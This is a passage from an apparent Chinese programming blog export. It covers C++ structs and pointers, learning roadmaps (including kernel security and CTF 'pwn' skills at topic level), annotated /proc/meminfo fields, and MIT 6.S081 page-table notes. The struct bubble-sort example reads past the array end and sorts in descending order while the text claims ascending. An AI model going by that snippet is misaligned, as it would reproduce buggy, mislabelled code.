&lt;&lt; &quot; 分数： &quot; &lt;&lt; stuArray[i].score &lt;&lt; endl; &#125;&#125; 运行结果如下： 姓名： 张三 年龄： 18 分数： 100姓名： 李四 年龄： 19 分数： 90姓名： 赵六 年龄： 15 分数： 95 结构体指针作用：通过指针访问结构体中的成员 利用操作符 -&gt;可以通过结构体指针访问结构体属性 1234567891011121314#include &lt;iostream&gt;#include&lt;string&gt;using namespace std;struct student &#123; string name; int age; int score;&#125;;int main()&#123; struct student s = &#123; &quot;张三&quot; , 16 , 98 &#125;; struct student * p = &amp;s; cout &lt;&lt; &quot;姓名： &quot; &lt;&lt; p-&gt;name &lt;&lt; &quot; 年龄： &quot; &lt;&lt; p-&gt;age &lt;&lt; &quot; 分数： &quot; &lt;&lt; p-&gt;score &lt;&lt; endl;&#125; 运行结果为： 姓名： 张三 年龄： 16 分数： 98 结构体嵌套结构体作用：结构体中的成员可以是另一个结构体 例如：每个老师辅导一个学员，一个老师的结构体中，记录一个学生的结构体 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;#include&lt;string&gt;using namespace std;struct student &#123; string name; int age; int score;&#125;;struct teacher&#123; string name; int id; int age; struct student stu;&#125;;int main()&#123; struct teacher t; t.name = &quot;张三&quot;; t.id = 100; t.age = 45; t.stu.name = &quot;李四&quot;; t.stu.age = 16; t.stu.score = 100; cout &lt;&lt; &quot;老师的姓名：&quot; &lt;&lt; t.name &lt;&lt; &quot; 老师的id：&quot; &lt;&lt; t.id &lt;&lt; &quot; 老师的年龄：&quot; &lt;&lt; t.age &lt;&lt; endl; cout &lt;&lt; &quot;老师指导的学生的姓名：&quot; &lt;&lt; t.stu.name &lt;&lt; &quot; 学生的年龄： &quot; &lt;&lt; t.stu.age &lt;&lt; &quot; 学生的成绩：&quot; &lt;&lt; t.stu.score &lt;&lt; endl;&#125; 运行结果为： 老师的姓名：张三 老师的id：100 老师的年龄：45老师指导的学生的姓名：李四 学生的年龄： 16 学生的成绩：100 结构体做函数参数作用：将结构体作为参数向函数中传递 传递方式有两种： 值传递 地址传递 1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;#include&lt;string&gt;using namespace std;struct student &#123; string name; int age; int score;&#125;;void PrintStu1(struct student s)&#123; s.name = &quot;李四&quot;; s.age = 19; s.score = 90; cout &lt;&lt; &quot;子函数1中学生姓名：&quot; &lt;&lt; s.name &lt;&lt; &quot; 年龄：&quot; &lt;&lt; s.age &lt;&lt; &quot; 分数：&quot; &lt;&lt; s.score &lt;&lt; endl;&#125;void PrintStu2(struct student* p)&#123; p-&gt;name = &quot;李四&quot;; p-&gt;age = 19; p-&gt;score = 90; cout &lt;&lt; &quot;子函数2中学生姓名：&quot; &lt;&lt; p-&gt;name &lt;&lt; &quot; 年龄：&quot; &lt;&lt; p-&gt;age &lt;&lt; &quot; 分数：&quot; &lt;&lt; p-&gt;score &lt;&lt; endl;&#125;int main()&#123; struct student s = &#123; &quot;张三&quot; , 16 , 100 &#125;; cout &lt;&lt; &quot;main函数中学生姓名：&quot; &lt;&lt; s.name &lt;&lt; &quot; 年龄：&quot; &lt;&lt; s.age &lt;&lt; &quot; 分数：&quot; &lt;&lt; s.score &lt;&lt; endl; PrintStu1(s); cout &lt;&lt; &quot;main函数中学生姓名：&quot; &lt;&lt; s.name &lt;&lt; &quot; 年龄：&quot; &lt;&lt; s.age &lt;&lt; &quot; 分数：&quot; &lt;&lt; s.score &lt;&lt; endl; PrintStu2(&amp;s); cout &lt;&lt; &quot;main函数中学生姓名：&quot; &lt;&lt; s.name &lt;&lt; &quot; 年龄：&quot; &lt;&lt; s.age &lt;&lt; &quot; 分数：&quot; &lt;&lt; s.score &lt;&lt; endl;&#125; 运行结果为： main函数中学生姓名：张三 年龄：16 分数：100子函数1中学生姓名：李四 年龄：19 分数：90main函数中学生姓名：张三 年龄：16 分数：100子函数2中学生姓名：李四 年龄：19 分数：90main函数中学生姓名：李四 年龄：19 分数：90 结构体中const的使用场景作用：用const来防止误操作 12345678910111213141516171819#include &lt;iostream&gt;#include&lt;string&gt;using namespace std;struct student &#123; string name; int age; int score;&#125;;void PrintStu(const struct student * s)&#123; s-&gt;name = &quot;李四&quot;;&#125;int main()&#123; struct student s = &#123; &quot;张三&quot; , 16 , 100 &#125;; PrintStu(&amp;s);&#125; 结果如下： 程序报错，不能修改 结构体案例一案例描述：学校正在做毕设项目，每名老师带领五个学生，总共有三名老师，需求如下 设计学生和老师的结构体，其中在老师的结构体中，有老师姓名和一个存放五名学生的数组作为成员 学生的成员有姓名、考试分数，创建数组存放三名老师，通过函数给每个老师及所带学生的学生数赋值 最终打印出老师数据以及老师所带学生的数据 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;iostream&gt;#include&lt;string&gt;using namespace std;struct student &#123; string sname; int score;&#125;;struct teacher&#123; string tname; struct student stuArray[5];&#125;;void inAll(struct teacher * s)&#123; printf(&quot;请输入老师的姓名：&quot;); cin &gt;&gt; s-&gt;tname; for (int i = 0; i &lt; 5; i++) &#123; printf(&quot;\\n请输入第%d位同学的姓名和成绩&quot;,i+1); cin&gt;&gt;s-&gt;stuArray[i].sname&gt;&gt;s-&gt;stuArray[i].score; &#125;&#125;void outAll(struct teacher t)&#123; cout &lt;&lt; &quot;老师的姓名&quot; &lt;&lt; t.tname &lt;&lt; endl; for (int i = 0; i &lt; 5; i++) &#123; cout &lt;&lt; &quot;学生&quot; &lt;&lt;i+1&lt;&lt;&quot;姓名为：&quot;&lt;&lt; t.stuArray[i].sname &lt;&lt; &quot; 成绩为：&quot; &lt;&lt; t.stuArray[i].score &lt;&lt; endl; &#125;&#125;int main()&#123; struct teacher tArray[3]; for (int i = 0; i &lt; 3; i++) &#123; inAll(&amp;tArray[i]); &#125; for (int i = 0; i &lt; 3; i++) &#123; outAll(tArray[i]); &#125;&#125; 运行结果如下： 请输入老师的姓名：老师1 请输入第1位同学的姓名和成绩学生11 90 请输入第2位同学的姓名和成绩学生12 90 请输入第3位同学的姓名和成绩学生13 80 请输入第4位同学的姓名和成绩学生14 79 请输入第5位同学的姓名和成绩学生15 98请输入老师的姓名：老师2 请输入第1位同学的姓名和成绩学生21 80 请输入第2位同学的姓名和成绩学生22 79 请输入第3位同学的姓名和成绩学生23 80 请输入第4位同学的姓名和成绩学生24 79 请输入第5位同学的姓名和成绩学生25 90请输入老师的姓名：老师3 请输入第1位同学的姓名和成绩学生31 90 请输入第2位同学的姓名和成绩学生32 89 请输入第3位同学的姓名和成绩学生33 79 请输入第4位同学的姓名和成绩学生34 80 请输入第5位同学的姓名和成绩学生35 98老师的姓名老师1学生1姓名为：学生11 成绩为：90学生2姓名为：学生12 成绩为：90学生3姓名为：学生13 成绩为：80学生4姓名为：学生14 成绩为：79学生5姓名为：学生15 成绩为：98老师的姓名老师2学生1姓名为：学生21 成绩为：80学生2姓名为：学生22 成绩为：79学生3姓名为：学生23 成绩为：80学生4姓名为：学生24 成绩为：79学生5姓名为：学生25 成绩为：90老师的姓名老师3学生1姓名为：学生31 成绩为：90学生2姓名为：学生32 成绩为：89学生3姓名为：学生33 成绩为：79学生4姓名为：学生34 成绩为：80学生5姓名为：学生35 成绩为：98 结构体案例二案例描述： 设计一个英雄的结构体，包括成员姓名，年龄，性别：创建结构体数组，数组中存放五名英雄。 通过冒泡排序的算法，将数组中的英雄按照年龄进行升序排序，最终打印排序后的结果。 12345678910111213141516171819202122232425262728293031323334353637#include &lt;iostream&gt;#include&lt;string&gt;using namespace std;struct Hero&#123; string name; int age; string sex;&#125;;int main()&#123; struct Hero heroArray[5] = &#123; &#123;&quot;刘备&quot;, 21, &quot;男&quot;&#125;, &#123; &quot;关羽&quot;,19,&quot;男&quot; &#125;, &#123; &quot;张飞&quot;,23,&quot;男&quot; &#125;, &#123; &quot;赵云&quot;,20,&quot;男&quot; &#125;, &#123; &quot;黄忠&quot;,18,&quot;男&quot; &#125; &#125;; int len = sizeof(heroArray) / sizeof(heroArray[0]); for (int i = 0; i &lt; len - 1; i++) &#123; for (int j = 0; j &lt; len; j++) &#123; if (heroArray[j+1].age &gt; heroArray[j].age) &#123; struct Hero temp = heroArray[j]; heroArray[j] = heroArray[j+1]; heroArray[j+1] = temp; &#125; &#125; &#125; for (int i = 0; i &lt; len; i++) &#123; cout &lt;&lt; heroArray[i].name &lt;&lt; heroArray[i].age &lt;&lt; heroArray[i].sex &lt;&lt; endl; &#125;&#125; 运行结果如下： 张飞23男刘备21男赵云20男关羽19男黄忠18男","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"C++","slug":"编程语言/C","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/"},{"name":"语法","slug":"编程语言/C/语法","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/%E8%AF%AD%E6%B3%95/"}],"tags":[{"name":"C++","slug":"C","permalink":"http://example.com/tags/C/"}]},{"title":"C++学习 指针","slug":"C++-学习-指针","date":"2023-04-09T05:57:28.000Z","updated":"2023-05-09T08:11:56.207Z","comments":true,"path":"2023/04/09/C++-学习-指针/","link":"","permalink":"http://example.com/2023/04/09/C++-%E5%AD%A6%E4%B9%A0-%E6%8C%87%E9%92%88/","excerpt":"指针基本概念指针的作用： 可以通过指针间接访问内存 内存编号是从0开始记录的，一般用十六进制数字表示 可以利用指针变量保存地址","text":"指针基本概念指针的作用： 可以通过指针间接访问内存 内存编号是从0开始记录的，一般用十六进制数字表示 可以利用指针变量保存地址 可以通过一个指针来保存一个地址 指针的定义和使用定义指针指针定义的语法： 数据类型 \\* 指针变量名 12345678910#include &lt;iostream&gt;using namespace std;int main()&#123; int a = 10; int* p; p = &amp;a; cout &lt;&lt; &quot;a的地址为&quot; &lt;&lt; &amp;a &lt;&lt; endl; cout &lt;&lt; &quot;指针p为&quot; &lt;&lt; p &lt;&lt; endl;&#125; 运行结果为： a的地址为00000087472FFC84指针p为00000087472FFC84 我们可以得到指针就是地址 使用指针可以通过解引用的方式来找到指针指向的内存 指针前加 *代表解引用 1234567891011121314#include &lt;iostream&gt;using namespace std;int main()&#123; int a = 10; int* p; p = &amp;a; cout &lt;&lt; &quot;a的地址为&quot; &lt;&lt; &amp;a &lt;&lt; endl; cout &lt;&lt; &quot;指针p为&quot; &lt;&lt; p &lt;&lt; endl; *p = 1000; cout &lt;&lt; &quot;a = &quot; &lt;&lt; a &lt;&lt;endl; cout &lt;&lt; &quot;*p = &quot; &lt;&lt; *p &lt;&lt; endl;&#125; 运行结果为： a的地址为0000003F9953F7C4指针p为0000003F9953F7C4a &#x3D; 1000*p &#x3D; 1000 通过p找到a的内存，并且可以通过*p修改内存 指针所占内存空间指针也是一种数据类型，那么这种数据类型占用多少内存空间呢？ 在32位操作系统下：占用4个字节空间 在64位操作系统下：占用8个字节空间 123456789101112#include &lt;iostream&gt;using namespace std;int main()&#123; int a = 10; int* p = &amp;a; cout &lt;&lt; &quot;sizeof (p) = &quot; &lt;&lt; sizeof(p) &lt;&lt; endl; cout &lt;&lt; &quot;sizeof (int *) = &quot; &lt;&lt; sizeof(int *) &lt;&lt; endl; cout &lt;&lt; &quot;sizeof (char *) = &quot; &lt;&lt; sizeof(char *) &lt;&lt; endl; cout &lt;&lt; &quot;sizeof (float *) = &quot; &lt;&lt; sizeof(float *) &lt;&lt; endl; cout &lt;&lt; &quot;sizeof (double *) = &quot; &lt;&lt; sizeof(double *) &lt;&lt; endl;&#125; 运行结果为： sizeof (p) &#x3D; 8sizeof (int *) &#x3D; 8sizeof (char *) &#x3D; 8sizeof (float *) &#x3D; 8sizeof (double *) &#x3D; 8 因为指针是内存，所以不管是什么数据类型下，64位操作系统，指针都是占用8个字节空间大小 空指针和野指针空指针空指针：指针变量指向内存中为0的空间 用途：初始化指针变量 注意：空指针的内存是不可以访问的 12345678#include &lt;iostream&gt;using namespace std;int main()&#123; int* p = NULL; *p = 100;&#125; 程序运行错误 0~255之间的内存编号是系统占用的，因此不可以访问 野指针野指针：指针变量指向一段非法的内存空间 1234567#include &lt;iostream&gt;using namespace std;int main()&#123; int* p = (int *)0x1100; cout &lt;&lt; *p &lt;&lt; endl;&#125; 程序运行错误 在程序中尽量避免野指针 const修饰指针const修饰指针有三种情况 const修饰指针 - 常量指针指针的指向可以修改，指针指向的值不能修改 1const int * p; const修饰常量 - 指针常量指针的指向不可以改，指针指向的值可以改 1int * const p; const既修饰指针，又修饰常量指针的指向不可以改，指针指向的值也不可以改 1const int * const p; 12345678910111213141516171819202122#include &lt;iostream&gt;using namespace std;int main()&#123; int a = 10; int b = 10; //1、const 修饰指针 常量指针 const int * p1 = &amp;a; //*p1 = 20 错误 p1 = &amp;b;//正确 //2、const 修饰常量 指针常量 int* const p2 = &amp;a; *p2 = 100;//正确 //p2 = &amp;b; 错误 //3、const 既修饰常量又修饰指针 const int * const p3 = &amp;a; //*p3 = 100 错误 //p3 = &amp;b 错误&#125; 指针和数组利用指针访问数组中的数据元素 1234567891011121314#include &lt;iostream&gt;using namespace std;int main()&#123; int arr[] = &#123; 1, 2, 3, 4, 5, 6, 7, 8, 9 ,10 &#125;; int* p = arr; cout &lt;&lt; &quot;第一个元素为：&quot; &lt;&lt; arr[0] &lt;&lt; endl; cout &lt;&lt; &quot;指针访问第一个元素：&quot; &lt;&lt; *p &lt;&lt; endl; for (int i = 0; i &lt; 10; i++) &#123; cout &lt;&lt; *p &lt;&lt; endl; p++; &#125;&#125; 运行结果为： 第一个元素为：1指针访问第一个元素：112345678910 指针和函数利用指针作为函数参数，可以修改实参的值 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;using namespace std;void swap01(int a, int b)&#123; int temp = a; a = b; b = temp; return ;&#125;void swap02(int* p1, int* p2)&#123; int temp = *p1; *p1 = *p2; *p2 = temp;&#125;int main()&#123; int a = 10; int b = 20; //1、值传递 swap01(a, b); cout &lt;&lt; &quot;swap01后a的值为&quot; &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; &quot;swap01后b的值为&quot; &lt;&lt; b &lt;&lt; endl; //2、地址传递 swap02(&amp;a, &amp;b); cout &lt;&lt; &quot;swap02后a的值为&quot; &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; &quot;swap02后b的值为&quot; &lt;&lt; b &lt;&lt; endl;&#125; 运行结果如下： swap01后a的值为10swap01后b的值为20swap02后a的值为20swap02后b的值为10 指针、数组、函数案例描述：封装一个函数，利用冒泡排序，实现对整型数组的升序排序 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;using namespace std;//冒泡排序函数void bubbleSort(int * arr, int len)&#123; for (int i = 0; i &lt; len - 1; i++) &#123; for (int j = 0; j &lt; len - i - 1; j++) &#123; //如果j&gt;j+1,交换数字 if (arr[j] &gt; arr[j + 1]) &#123; int temp = arr[j]; arr[j] = arr[j + 1]; arr[j + 1] = temp; &#125; &#125; &#125;&#125;//打印数组void printArray(int* arr, int len)&#123; for (int i = 0; i &lt; len; i++) &#123; cout &lt;&lt; arr[i] &lt;&lt; endl; &#125;&#125;int main()&#123; //1、创建数组 int arr[10] = &#123;4 , 3 , 6 , 9 , 1 , 2 , 10 , 8 , 7 , 5&#125;; //数组长度 int len = sizeof(arr) / sizeof(arr[0]); //2、创建函数，实现冒泡排序 bubbleSort(arr, len); //3、打印排序后的数组 printArray(arr, len);&#125; 运行结果如下： 12345678910","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"C++","slug":"编程语言/C","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/"},{"name":"语法","slug":"编程语言/C/语法","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/%E8%AF%AD%E6%B3%95/"}],"tags":[{"name":"C++","slug":"C","permalink":"http://example.com/tags/C/"},{"name":"指针","slug":"指针","permalink":"http://example.com/tags/%E6%8C%87%E9%92%88/"}]},{"title":"学习路径","slug":"学习路径","date":"2023-04-08T12:15:26.000Z","updated":"2023-04-29T12:22:35.643Z","comments":true,"path":"2023/04/08/学习路径/","link":"","permalink":"http://example.com/2023/04/08/%E5%AD%A6%E4%B9%A0%E8%B7%AF%E5%BE%84/","excerpt":"Rust学习Rust的过程涉及多个阶段。这里提供了一个详细的Rust学习计划，帮助您逐步掌握这门语言： 1. 基础阶段","text":"Rust学习Rust的过程涉及多个阶段。这里提供了一个详细的Rust学习计划，帮助您逐步掌握这门语言： 1. 基础阶段 阅读《Rust编程语言》（The Rust Programming Language，又称”The Book”）：这是学习Rust的官方教材，为初学者提供了全面的入门知识。在线版本可免费访问：The Rust Programming Language - The Rust Programming Language 学习Rust的基本语法、数据类型、控制结构、错误处理等概念。 完成《The Book》中的示例和练习，以巩固所学知识。 参加Rust社区活动，如阅读论坛帖子、加入聊天室和邮件列表，以了解最新动态和获得帮助。 2. 实践阶段 尝试解决一些简单的编程问题，例如LeetCode上的题目，以熟悉Rust的编程范式。 阅读Rust编写的开源项目代码，学习他人如何使用Rust解决实际问题。 参与开源项目，为Rust生态做贡献。这可以帮助您熟悉实际项目中的编程实践、代码审查和协作流程。 开始实现自己的项目，将学到的知识应用于实践。可以从一个简单的命令行工具或Web服务开始。 3. 进阶阶段 深入了解Rust的所有权（Ownership）、借用（Borrowing）和生命周期（Lifetime）系统。这是理解Rust内存安全的关键。 学习Rust的并发和异步编程。掌握如何使用线程、通道、异步I&#x2F;O和async/await编写高性能、可扩展的Rust代码。 阅读Rust的官方文档，例如《Rust异步编程》（Asynchronous Programming in Rust）和《Rust标准库文档》（The Rust Standard Library Documentation），以深入了解各种概念和API。 学习Rust的宏（Macros）系统，了解如何编写DRY（Don’t Repeat Yourself）代码和元编程。 4. 专业阶段 探索Rust在不同领域的应用，例如Web开发、嵌入式系统、游戏开发、区块链等。 阅读有关Rust性能优化、安全性和最佳实践的文章和教程。 参加Rust会议和研讨会，与其他Rust开发者交流经验和技巧。 考虑投入到Rust生态系统的开发中，例如编写库、工具和框架，为社区提供贡献。 C++C++是一门功能强大的编程语言，学习过程可以分为多个阶段。以下是一份详细的C++学习计划，帮助您逐步掌握C++： 1. 基础阶段 阅读C++的经典教材，如《C++ Primer》(by Stanley B. Lippman, Josée Lajoie, and Barbara E. Moo) 或《C++程序设计原理与实践》（Programming: Principles and Practice Using C++, by Bjarne Stroustrup）。 学习C++的基本语法、数据类型、控制结构、函数、类和对象等概念。 练习编写简单的C++程序，巩固所学知识。 参加在线C++社区活动，如Stack Overflow和C++ subreddit，了解最新动态和获得帮助。 2. 实践阶段 学习使用C++标准库（STL），掌握容器、算法和迭代器等重要概念。 尝试解决一些实际编程问题，例如LeetCode上的题目，以熟悉C++编程范式。 阅读开源C++项目的代码，学习他人如何使用C++解决实际问题。 参与开源项目，为C++生态做贡献。这可以帮助您熟悉实际项目中的编程实践、代码审查和协作流程。 开始实现自己的项目，将学到的知识应用于实践。可以从一个简单的命令行工具或图形界面应用开始。 3. 进阶阶段 深入学习C++的高级特性，如模板、异常处理、智能指针、多态等。 学习C++的并发和多线程编程，掌握线程、互斥量、条件变量等概念。 阅读有关C++性能优化、内存管理和最佳实践的文章和教程。 学习C++11、C++14、C++17、C++20等新标准中的新特性，以便编写现代、高效的C++代码。 4. 专业阶段 探索C++在不同领域的应用，例如游戏开发、高性能计算、嵌入式系统等。 学习使用C++编写跨平台应用程序，使用诸如Qt等框架。 参加C++会议和研讨会，与其他C++开发者交流经验和技巧。 考虑投入到C++生态系统的开发中，例如编写库、工具和框架，为社区提供贡献。 云系统内核安全云系统内核安全是一个高度专业化的领域，涉及操作系统、虚拟化技术、硬件安全等多方面知识。以下是一份详细的云系统内核安全学习计划，帮助您逐步掌握相关知识： 1. 基础阶段 学习计算机组成原理和计算机体系结构，了解CPU、内存、IO设备等基本概念。 学习操作系统基础知识，如进程、线程、内存管理、文件系统、设备驱动等。 学习网络基础知识，掌握TCP&#x2F;IP协议栈、网络设备、网络安全等概念。 2. 虚拟化技术阶段 学习虚拟化技术的基本原理，了解全虚拟化和半虚拟化的区别。 学习常见的虚拟化平台，如VMware、KVM、Xen、Hyper-V等，了解它们的架构和特点。 学习容器技术，如Docker和Kubernetes，了解与虚拟机相比的优势和局限。 3. 云安全阶段 学习云计算的基本概念，了解IaaS、PaaS、SaaS等服务模型。 学习主流云服务提供商（如AWS、Azure、Google Cloud、阿里云等）的安全服务和最佳实践。 了解云安全的共享责任模型，学会在云环境中保护数据、网络、应用和用户的安全。 4. 内核安全阶段 深入学习操作系统内核，了解内核态和用户态的区别，学习内核编程。 学习内核漏洞的类型和原理，例如缓冲区溢出、竞争条件、提权漏洞等。 学习内核漏洞的利用技术，如ROP、堆喷射、内核地址泄露等。 学习内核安全防护技术，如内核地址随机化（KASLR）、内核代码只读（RO）、内存保护扩展（MPX）等。 5. 云系统内核安全阶段 学习虚拟化环境下的内核安全挑战，如虚拟机逃逸、共享资源攻击等。 学习容器环境下的内核安全挑战，如容器逃逸、资源隔离不足等。 学习硬件安全技术，如安全引导（Secure Boot）、可信计算（TPM）、英特尔SGX等。 学习云环境下的内核安全加固措施，如安全基线、监控、自动化补丁等。 6. 实践阶段 参与开源内核安全项目，为社区提供贡献。 阅读内核安全相关的研究论文和技术报告，了解最新的研究动态。 参加内核安全和云安全的会议和研讨会，与同行交流经验和技巧。 pwn学习网络安全和 “pwn” 技能需要时间和努力，但通过制定一个合理的计划，你可以逐步掌握所需的知识和技能。以下是一个建议的学习计划： 学习基础知识： 计算机科学基础：了解计算机系统的基本原理，学习编程语言（如 Python, C, Java 或 JavaScript）。 计算机网络：学习网络基本原理，如 OSI 模型、TCP&#x2F;IP 协议、路由和交换等。 操作系统：熟悉 Windows、Linux 和 macOS 等操作系统的原理和使用。 学习网络安全基础： 加密与解密：学习基本的密码学原理，如对称加密、非对称加密、哈希函数等。 系统安全：了解常见的系统漏洞，如缓冲区溢出、SQL 注入、跨站脚本等。 安全工具：熟悉常用的安全工具，如 Wireshark、Nmap、Metasploit 等。 掌握 Pwn 技能： 静态分析：学习使用反汇编和调试工具（如 IDA Pro、Ghidra、OllyDbg 等）分析程序。 动态分析：学习使用调试器（如 GDB、x64dbg 等）调试程序，了解程序运行时的状态。 漏洞挖掘：学习如何发现潜在漏洞，如内存泄漏、整数溢出、格式化字符串等。 漏洞利用：学习编写利用代码，如利用 ROP 技术绕过 DEP、使用堆喷射绕过 ASLR 等。 实践与进阶： 参加 CTF 比赛：参加 Capture The Flag（CTF）比赛，提高实战能力。 研究漏洞案例：分析已知的漏洞案例，了解漏洞发现和利用的具体过程。 学习安全研究论文：阅读网络安全领域的学术论文，跟踪最新技术和研究成果。 参与开源项目：参与网络安全相关的开源项目，如漏洞扫描器、安全框架等。 持续学习： 关注安全领域的新闻和动态：关注网络安全领域的新闻、博客、漏洞报告等。 参加安全会议：参加网络安全会议（如 DEFCON、Black Hat 等），了解最新的安全趋势和技术。 建立个人网络：加入网络安全社区，与同行交流，分享经验和技巧。","categories":[{"name":"学习路径","slug":"学习路径","permalink":"http://example.com/categories/%E5%AD%A6%E4%B9%A0%E8%B7%AF%E5%BE%84/"}],"tags":[]},{"title":"Ubuntu源码 /proc/meminfo","slug":"学习 Ubuntu源码-proc-meminfo","date":"2023-04-06T06:56:58.000Z","updated":"2023-04-06T07:26:56.266Z","comments":true,"path":"2023/04/06/学习 Ubuntu源码-proc-meminfo/","link":"","permalink":"http://example.com/2023/04/06/%E5%AD%A6%E4%B9%A0%20Ubuntu%E6%BA%90%E7%A0%81-proc-meminfo/","excerpt":"","text":"1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253MemTotal: 3982192 kB 系统总内存大小MemFree: 333280 kB 系统中未使用的内存大小MemAvailable: 2062852 kB 系统中可供分配的内存大小，包括缓存和缓冲区Buffers: 149848 kB 用于文件I/O的临时存储区域的大小Cached: 1762576 kB 被操作系统缓存的文件大小SwapCached: 356 kB 已被交换且在内存中的数据大小Active: 1183472 kB 正在使用或最近被使用过的内存大小Inactive: 1406216 kB 最近没有被使用的内存大小Active(anon): 2988 kB 活动匿名内存大小，不包括文件Inactive(anon): 723692 kB 非活动匿名内存大小，不包括文件Active(file): 1180484 kB 活动文件内存大小Inactive(file): 682524 kB 非活动文件内存大小Unevictable: 0 kB 无法驱逐的内存大小Mlocked: 0 kB 锁定在内存中的内存大小SwapTotal: 3991548 kB 系统总交换空间大小SwapFree: 3987928 kB 系统交换空间空闲内存Zswap: 0 kB 使用 zswap 的压缩交换缓存大小Zswapped: 0 kB 使用 zswap 的压缩交换缓存大小Dirty: 180 kB 等待写回磁盘的内存大小Writeback: 0 kB 正在写回磁盘的内存大小AnonPages: 676928 kB 未映射到文件的匿名内存大小Mapped: 339472 kB 映射到文件的内存大小Shmem: 55032 kB 共享内存大小KReclaimable: 142032 kB 可回收的内核内存大小Slab: 417952 kB 内核数据结构缓存的大小SReclaimable: 142032 kB 可回收的 Slab 内存大小SUnreclaim: 275920 kB 不可回收的 Slab 内存大小KernelStack: 11180 kB 内核栈使用的内存大小PageTables: 16944 kB 页表使用的内存大小NFS_Unstable: 0 kB NFS 不稳定页缓存的大小Bounce: 0 kB 用于块设备 I/O 的跳跃缓冲区大小WritebackTmp: 0 kB 临时写回内存大小CommitLimit: 5982644 kB 基于内存和交换空间的提交限制Committed_AS: 4906744 kB 已提交的内存大小，包括内存和交换空间VmallocTotal: 34359738367kB 虚拟内存分配的总量，这是系统可以使用的虚拟内存总量VmallocUsed: 251220 kB 已使用的虚拟内存量VmallocChunk: 0 kB 最大连续虚拟内存空闲区域的大小Percpu: 134656 kB 每个 CPU 的内存使用量，这个值是每个 CPU 的 per-CPU 区域的大小之和HardwareCorrupted: 0 kB 由硬件错误导致的损坏内存量AnonHugePages: 4096 kB 用于匿名映射的大内存页的总量，这些映射不会关联到任何文件ShmemHugePages: 0 kB 用于共享内存（shmem）的大内存页的总量ShmemPmdMapped: 0 kB 已映射到共享内存的PMD大小，PMD 是页中间目录的缩写FileHugePages: 0 kB 用于文件映射的大内存页的总量FilePmdMapped: 0 kB 已映射到文件的 PMD 大小HugePages_Total: 0 系统配置的大内存页的总数HugePages_Free: 0 当前可用的大内存页的数量HugePages_Rsvd: 0 已预留（保留）但尚未使用的大内存页的数量HugePages_Surp: 0 超出系统需求的大内存页的数量，这些页可以在需要时立即分配给应用程序Hugepagesize: 2048 kB 系统配置的大内存页的大小Hugetlb: 0 kB 当前使用的 hugetlb 内存池的总大小，hugetlb 是大内存页的缩写DirectMap4k: 202624 kB 使用 4KB 大小的页映射的物理内存大小DirectMap2M: 3991552 kB 使用 2MB 大小的页映射的物理内存大小DirectMap1G: 2097152 kB 使用 1GB 大小的页映射的物理内存大小","categories":[{"name":"Ubuntu源码","slug":"Ubuntu源码","permalink":"http://example.com/categories/Ubuntu%E6%BA%90%E7%A0%81/"}],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"http://example.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"http://example.com/tags/Ubuntu/"}]},{"title":"MIT6 S081 Operating System Engineering Lecture04 Page Tables","slug":"MIT6-S081-Operating-System-Engineering-Lecture04-Page-Tables","date":"2023-04-05T09:03:11.000Z","updated":"2023-04-14T11:30:30.108Z","comments":true,"path":"2023/04/05/MIT6-S081-Operating-System-Engineering-Lecture04-Page-Tables/","link":"","permalink":"http://example.com/2023/04/05/MIT6-S081-Operating-System-Engineering-Lecture04-Page-Tables/","excerpt":"Topic Address Spaces 支持虚拟内存的硬件 XV中的虚拟内存代码 Address Spaces","text":"Topic Address Spaces 支持虚拟内存的硬件 XV中的虚拟内存代码 Address Spaces为什么需要隔离性创造虚拟内存的一个出发点是你可以通过它实现隔离性。如果你正确的设置了page table，并且通过代码对它进行正确的管理，那么原则上你可以实现强隔离。 我们期望的是，每个用户程序都被装进一个盒子里，这样它们就不会彼此影响了。类似的，我们也想让它们与内核操作系统相互独立，这样如果某个应用程序无意或者故意做了一些坏事，也不会影响到操作系统。 如果我们不做任何工作，默认情况下我们是没有内存隔离性的。 RISC-V主板上，内存是由一些DRAM芯片组成。在这些DRAM芯片中保存了程序的数据和代码。例如内存中的某一个部分是内核，包括了文本，数据，栈等等；如果运行了Shell，内存中的某个部分就是Shell；如果运行了cat程序，内存中的某个部分是cat程序。这里说的都是物理内存，它的地址从0开始到某个大的地址结束。结束地址取决于我们的机器现在究竟有多少物理内存。所有程序都必须存在于物理内存中，否则处理器甚至都不能处理程序的指令。 这里的风险很明显。我们简单化一下场景，假设Shell存在于内存地址1000-2000之间。 如果cat出现了程序错误，将内存地址1000，也就是Shell的起始地址加载到寄存器a0中。之后执行sd $7, (a0)，这里等效于将7写入内存地址1000。 现在cat程序弄乱了Shell程序的内存镜像，所以隔离性被破坏了，这是我们不想看到的现象。所以，我们想要某种机制，能够将不同程序之间的内存隔离开来，这样类似的事情就不会发生。一种实现方式是地址空间（Address Spaces）。 基本概念这里的基本概念也很简单直观，我们给包括内核在内的所有程序专属的地址空间。所以，当我们运行cat时，它的地址空间从0到某个地址结束。当我们运行Shell时，它的地址也从0开始到某个地址结束。内核的地址空间也从0开始到某个地址结束。 